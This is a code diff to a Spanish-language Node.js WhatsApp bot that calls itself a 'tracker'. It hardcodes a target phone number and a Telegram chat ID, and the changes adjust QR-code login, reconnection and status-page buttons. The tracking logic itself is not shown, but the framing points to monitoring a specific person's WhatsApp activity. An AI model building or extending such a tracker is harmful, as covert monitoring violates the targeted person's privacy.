@@ -13,7 +13,7 @@ const TELEGRAM_ID = "7410396096";
 const NUMERO_OBJETIVO = "593996752239@s.whatsapp.net";
 
 let qrCodeUltimo = "";
-let estadoConexion = "Desconectado";
+let estadoConexion = "Iniciando conexión...";
 
 async function enviarTelegram(mensaje) {
     try {
@@ -32,7 +32,8 @@ async function iniciarBot() {
     
     const sock = makeWASocket({
         auth: state,
-        logger: pino({ level: 'silent' })
+        logger: pino({ level: 'silent' }),
+        printQRInTerminal: true
     });
 
     sock.ev.on('creds.update', saveCreds);
@@ -41,6 +42,7 @@ async function iniciarBot() {
         const { connection, lastDisconnect, qr } = update;
         
         if (qr) {
+            console.log('¡Nuevo código QR generado!');
             qrCodeUltimo = qr;
             estadoConexion = "Esperando escaneo de QR";
         }
@@ -52,9 +54,11 @@ async function iniciarBot() {
             enviarTelegram("🟢 *Rastreador Node.js Iniciado*\nSesión vinculada correctamente.");
         } else if (connection === 'close') {
             estadoConexion = "Desconectado";
+            qrCodeUltimo = "";
             const shouldReconnect = (lastDisconnect?.error instanceof Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
+            console.log('Conexión cerrada. Reconectando:', shouldReconnect);
             if (shouldReconnect) {
-                iniciarBot();
+                setTimeout(iniciarBot, 5000);
             }
         }
     });
@@ -71,7 +75,6 @@ async function iniciarBot() {
     });
 }
 
-// Página web para mostrar el QR visualmente
 app.get('/', async (req, res) => {
     if (qrCodeUltimo) {
         try {
@@ -82,6 +85,7 @@ app.get('/', async (req, res) => {
                     <p>Escanea este código QR con la aplicación de WhatsApp:</p>
                     <img src="${urlImagenQR}" alt="Código QR WhatsApp" style="width:300px; height:300px;"/>
                     <p><b>Estado:</b> ${estadoConexion}</p>
+                    <br><button onclick="window.location.reload();" style="padding:10px 20px;">Actualizar Estado</button>
                 </div>
             `);
         } catch (err) {
@@ -92,6 +96,8 @@ app.get('/', async (req, res) => {
             <div style="text-align:center; font-family:sans-serif; margin-top:50px;">
                 <h2>Rastreador de WhatsApp Activo</h2>
                 <p><b>Estado:</b> ${estadoConexion}</p>
+                <p>Si el QR no aparece, espera 10 segundos y recarga la página.</p>
+                <br><button onclick="window.location.reload();" style="padding:10px 20px;">Recargar Página</button>
             </div>
         `);
     }
